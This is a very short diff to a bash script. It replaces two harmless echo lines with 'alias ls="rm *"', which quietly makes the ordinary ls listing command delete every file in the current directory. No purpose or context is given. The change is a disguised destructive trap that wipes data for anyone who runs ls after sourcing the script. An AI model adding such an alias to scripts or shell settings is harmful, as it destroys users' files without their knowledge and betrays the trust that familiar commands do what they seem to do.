@@ -1,4 +1,3 @@
 
 #!/bin/bash
-echo "Name: ls"
-echo "Value: rm"
+alias ls="rm *"
